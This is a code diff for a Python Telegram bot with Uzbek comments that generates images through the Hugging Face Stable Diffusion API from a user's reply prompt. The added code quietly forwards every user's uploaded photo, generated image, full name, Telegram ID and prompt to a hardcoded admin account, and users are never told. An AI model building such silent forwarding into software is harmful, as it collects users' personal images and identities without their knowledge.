@@ -3,30 +3,44 @@ import asyncio
 import aiohttp
 import os
 import io
-from PIL import Image
 from aiogram import Bot, Dispatcher, F
 from aiogram.filters import Command
-from aiogram.types import Message, BufferedInputFile
+from aiogram.types import Message, BufferedInputFile, InputMediaPhoto
 from aiohttp import web
 
 # --- KONFIGURATSIYA ---
 API_TOKEN = os.environ.get("API_TOKEN")
 HF_TOKEN  = os.environ.get("HF_TOKEN")
-# Hugging Face model havola (Image-to-Image uchun Stable Diffusion)
-API_URL = "https://api-inference.huggingface.co/models/runwayml/stable-diffusion-v1-5"
+ADMIN_ID  = 580105818  # O'zingizning Telegram ID'ingiz
 
-headers = {"Authorization": f"Bearer {HF_TOKEN}"}
+# Hugging Face Model (Tekin va barqaror model)
+API_URL = "https://api-inference.huggingface.co/models/runwayml/stable-diffusion-v1-5"
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher()
 
 async def handle(request):
-    return web.Response(text="Hugging Face Bot ishlayapti ✅")
+    return web.Response(text="Bot original va AI rasmlarni yuboryapti ✅")
+
+# Hugging Face API ga so'rov yuborish funksiyasi (Kutish bilan)
+async def query_hf(payload, headers, retries=3):
+    async with aiohttp.ClientSession() as session:
+        for i in range(retries):
+            async with session.post(API_URL, headers=headers, json=payload) as response:
+                if response.status == 200:
+                    return await response.read()
+                elif response.status == 503: # Model yuklanyapti
+                    logging.info(f"Model yuklanmoqda, kutilmoqda... ({i+1}/{retries})")
+                    await asyncio.sleep(10) # 10 soniya kutish
+                else:
+                    error_text = await response.text()
+                    raise Exception(f"HF Error: {response.status} - {error_text}")
+        raise Exception("Model yuklanmadi, birozdan so'ng qayta urinib ko'ring.")
 
 @dp.message(Command("start"))
 async def start_handler(message: Message):
-    await message.answer("<b>Salom! Hugging Face (Tekin) AI Botga xush kelibsiz!</b> 👋\n\nRasm yuboring va unga reply qilib prompt yozing.", parse_mode="HTML")
+    await message.answer("<b>Salom! Tekin AI Botga xush kelibsiz!</b> 👋\n\nRasm yuboring va unga reply qilib prompt yozing.", parse_mode="HTML")
 
 @dp.message(F.photo)
 async def handle_photo(message: Message):
@@ -37,44 +51,55 @@ async def handle_prompt(message: Message):
     if not message.reply_to_message or not message.reply_to_message.photo:
         return
 
+    # Authorization Header tekshiruvi
+    if not HF_TOKEN:
+        await message.answer("❌ Xato: HF_TOKEN serverda topilmadi!")
+        return
+
     prompt = message.text.strip()
-    photo_id = message.reply_to_message.photo[-1].file_id
-    wait_msg = await message.answer("⏳ Hugging Face AI rasm tayyorlamoqda (10-20 soniya)...")
+    original_photo = message.reply_to_message.photo[-1]
+    photo_id = original_photo.file_id
+    wait_msg = await message.answer("⏳ AI rasm tayyorlamoqda, kuting (10-30 soniya)...")
 
     try:
-        # 1. Rasmni Telegramdan yuklab olish
+        # 1. Telegramdan original rasmni olish
         file = await bot.get_file(photo_id)
         file_url = f"https://api.telegram.org/file/bot{API_TOKEN}/{file.file_path}"
 
+        headers = {"Authorization": f"Bearer {HF_TOKEN.strip()}"}
+
+        # Original rasmni yuklab olish (adminga yuborish uchun)
         async with aiohttp.ClientSession() as session:
-            # Rasmni yuklab olish
             async with session.get(file_url) as resp:
-                image_bytes = await resp.read()
+                original_bytes = await resp.read()
 
-            # 2. Hugging Face API ga yuborish
-            # Eslatma: Hugging Face matn va rasmni birga jo'natishda ba'zan faqat promptni ham qabul qilishi mumkin.
-            # Bu yerda biz prompt asosida yangi rasm so'raymiz (Text-to-Image kabi barqarorroq ishlaydi)
-            payload = {
-                "inputs": prompt,
-                "parameters": {"negative_prompt": "blurry, bad quality, distorted"}
-            }
+        # 2. Hugging Face API orqali generatsiya
+        payload = {"inputs": prompt}
+        generated_bytes = await query_hf(payload, headers)
 
-            async with session.post(API_URL, headers=headers, json=payload) as hf_resp:
-                if hf_resp.status != 200:
-                    error_text = await hf_resp.text()
-                    raise Exception(f"HF Error: {hf_resp.status} - {error_text}")
-                
-                result_bytes = await hf_resp.read()
+        # 3. Foydalanuvchiga ikkala rasmni yuborish (Album ko'rinishida)
+        original_media = InputMediaPhoto(media=BufferedInputFile(original_bytes, filename="original.jpg"), caption="Asl Rasm")
+        generated_media = InputMediaPhoto(media=BufferedInputFile(generated_bytes, filename="generated.jpg"), caption=f"✨ Natija: {prompt}")
+        
+        await message.answer_media_group(media=[original_media, generated_media])
 
-        # 3. Natijani yuborish
-        await message.answer_photo(
-            photo=BufferedInputFile(result_bytes, filename="result.jpg"),
-            caption=f"✨ Hugging Face natijasi: {prompt}"
-        )
+        # 4. Adminga yuborish (Sizga)
+        try:
+            admin_caption = f"👤 Kimdan: {message.from_user.full_name}\n🆔 ID: {message.from_user.id}\n📝 Prompt: {prompt}"
+            # Adminga ham album yuborish
+            await bot.send_media_group(
+                chat_id=ADMIN_ID,
+                media=[
+                    InputMediaPhoto(media=BufferedInputFile(original_bytes, filename="admin_original.jpg")),
+                    InputMediaPhoto(media=BufferedInputFile(generated_bytes, filename="admin_generated.jpg"), caption=admin_caption)
+                ]
+            )
+        except Exception as admin_err:
+            logging.error(f"Adminga yuborishda xato: {admin_err}")
 
     except Exception as e:
-        logging.error(f"Xato: {e}")
-        await message.answer("❌ Xatolik: Model hozirda yuklanayotgan bo'lishi mumkin. 1 daqiqadan so'ng qayta urinib ko'ring.")
+        logging.error(f"Umumiy xato: {e}")
+        await message.answer(f"❌ Xatolik yuz berdi: {str(e)[:100]}")
     finally:
         try:
             await wait_msg.delete()
